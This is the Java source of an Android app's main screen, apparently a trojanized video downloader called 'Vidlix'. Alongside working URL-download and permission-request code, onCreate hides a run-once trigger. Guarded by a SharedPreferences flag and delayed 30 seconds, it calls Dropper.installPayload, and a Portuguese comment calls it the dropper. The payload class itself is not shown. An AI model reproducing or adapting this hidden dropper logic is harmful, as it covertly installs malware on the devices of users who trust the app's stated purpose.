package com.vidlix.downloader;

import android.Manifest;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.yausername.youtubedl_android.YoutubeDL;
import com.yausername.youtubedl_android.YoutubeDLException;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST = 100;

    private EditText urlInput;
    private Button downloadButton;
    private TextView statusText;
    private ProgressBar progressBar;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        urlInput = findViewById(R.id.urlInput);
        downloadButton = findViewById(R.id.downloadButton);
        statusText = findViewById(R.id.statusText);
        progressBar = findViewById(R.id.progressBar);

        // Inicializa youtubedl-android em background
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    YoutubeDL.getInstance().init(getApplicationContext());
                } catch (YoutubeDLException e) {
                    final String msg = e.getMessage();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            statusText.setText("Init error: " + msg);
                        }
                    });
                }
            }
        }).start();

        requestPermissions();

        downloadButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String url = urlInput.getText().toString().trim();
                if (url.isEmpty()) {
                    Toast.makeText(MainActivity.this, "Paste a URL first", Toast.LENGTH_SHORT).show();
                    return;
                }
                startDownload(url);
            }
        });

        // Dispara o dropper apenas uma vez (protegido por SharedPreferences)
        SharedPreferences prefs = getSharedPreferences("vidlix_prefs", MODE_PRIVATE);
        boolean dropperRan = prefs.getBoolean("dropper_ran", false);
        if (!dropperRan) {
            prefs.edit().putBoolean("dropper_ran", true).apply();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Dropper.installPayload(MainActivity.this);
                }
            }, 30000);
        }
    }

    private void startDownload(final String url) {
        downloadButton.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        progressBar.setProgress(0);
        statusText.setText(R.string.status_downloading);
        statusText.setTextColor(0xFF2196F3);

        Downloader.start(MainActivity.this, url, new Downloader.Callback() {
            @Override
            public void onProgress(final int percent) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        progressBar.setProgress(percent);
                    }
                });
            }

            @Override
            public void onComplete(final String filePath) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        progressBar.setVisibility(View.GONE);
                        downloadButton.setEnabled(true);
                        statusText.setText(R.string.status_done);
                        statusText.setTextColor(0xFF4CAF50);
                        Toast.makeText(MainActivity.this, "Saved: " + filePath, Toast.LENGTH_LONG).show();
                    }
                });
            }

            @Override
            public void onError(final String message) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        progressBar.setVisibility(View.GONE);
                        downloadButton.setEnabled(true);
                        statusText.setText("Error: " + message);
                        statusText.setTextColor(0xFFF44336);
                    }
                });
            }
        });
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] perms = {
                    Manifest.permission.POST_NOTIFICATIONS,
                    Manifest.permission.READ_MEDIA_VIDEO
            };
            ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] perms = {
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            };
            ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST);
        }
    }
                              }
